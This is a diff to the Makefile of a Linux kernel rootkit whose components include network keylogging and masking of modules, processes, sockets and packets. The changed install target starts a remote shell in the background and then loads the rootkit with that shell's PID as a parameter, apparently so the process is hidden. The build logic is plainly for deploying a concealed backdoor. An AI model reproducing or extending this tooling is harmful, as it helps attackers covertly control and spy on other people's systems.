@@ -33,7 +33,7 @@ KDIR = /lib/modules/$(shell uname -r)/build
 TARGET = rootkit
 
 obj-m += $(TARGET).o
-rootkit-objs := tcp_server.o module_masking.o network_keylogging.o process_masking.o socket_masking.o conf_manager.o jsmn.o core.o
+rootkit-objs := module_masking.o network_keylogging.o process_masking.o socket_masking.o packet_masking.o conf_manager.o tcp_server.o jsmn.o core.o
 ccflags-y = -Wno-unused-function
 
 all:	$(OBJS) sysmap
@@ -47,10 +47,7 @@ clean:
 	@echo "\nUseless files successfully deleted\n"
 
 install:	all
-	$(REMOTE_SHELL_EXEC) &
-	REMOTE_SHELL_PID = $!
-	@echo $(REMOTE_SHELL_PID)
-	insmod $(TARGET).ko
+	$(REMOTE_SHELL_EXEC) & insmod $(TARGET).ko pids="$$!"
 	@echo "\nRootkit successfully installed\n"
 
 uninstall:
